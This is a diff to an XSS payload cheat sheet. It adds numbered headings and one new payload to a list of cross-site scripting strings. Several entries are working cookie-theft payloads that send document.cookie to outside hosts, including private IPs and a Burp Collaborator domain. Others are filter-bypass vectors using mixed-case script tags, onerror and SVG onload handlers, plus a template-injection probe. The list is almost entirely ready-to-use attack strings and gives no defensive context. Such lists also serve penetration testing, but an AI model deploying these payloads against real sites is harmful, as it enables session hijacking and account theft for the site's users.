@@ -20,13 +20,23 @@ i.src="http://192.168.0.18:8888/?"+document.cookie;
 # Payload 5
 <img src=x onerror="this.src='http://192.168.0.18:8888/?'+document.cookie; this.removeAttribute('onerror');">
 
+# Payload 6
 “--></sCrIpT><sCrIpT>document.location=“http://vvuim9b9t49t2kpvv7f4gq27kyqoed.burpcollaborator.net/?c=“+document.cookie;</sCrIpT>
 
+# Payload 7
 <script>img = new Image(); img.src = "http://192.168.1.44/a.php?"+document.cookie;</script>
 
+# Payload 8
 "><a%20href="https://xxxxxxxxxxxxxxx.burpcollaborator.net"><H1>Click%20here!</H1></a><input
+
+# Payload 9
 "><sVg/OnLuFy="X=y"oNloaD=;1^confirm(1)>/``^1//
+
+# Payload 10
 --'`"><img src=x>kdskf${{7*7}}
+# Payload 11
+input "><script>prompt(1)</script>
+
 ==============================================================================
 [+] Bypass XSS
 ==============================================================================
